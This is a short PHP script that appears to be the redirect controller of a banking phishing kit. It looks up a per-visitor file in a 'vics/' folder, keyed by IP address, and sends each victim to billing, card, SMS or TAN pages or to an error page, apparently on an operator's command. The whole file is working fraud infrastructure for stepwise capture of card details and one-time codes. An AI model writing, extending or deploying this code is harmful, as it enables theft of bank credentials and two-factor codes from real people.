<?php
header('Content-Type: application/json');

$ip = $_GET['ip'] ?? '';
if (empty($ip)) {
    echo json_encode(['redirect' => '']);
    exit;
}

$ip = preg_replace('/[^0-9a-f\.:]/i', '', $ip);
$file = 'vics/' . $ip . '.txt';

$redirect = '';
$step = 'wait';

if (file_exists($file)) {
    $content = trim(file_get_contents($file));
    $lines = explode("\n", $content);
    $step = trim($lines[0]);
}

switch ($step) {
    case 'billing': $redirect = 'billing.php'; break;
    case 'card': $redirect = 'card.php'; break;
    case 'sms': $redirect = 'sms.php'; break;
    case 'tan': $redirect = 'tan.php'; break;
    case 'reset': $redirect = 'billing.php'; break;
    case 'block': $redirect = 'error.html'; break;
    case 'success': $redirect = 'done.php'; break;
    default: $redirect = '';
}

echo json_encode(['step' => $step, 'redirect' => $redirect]);
?>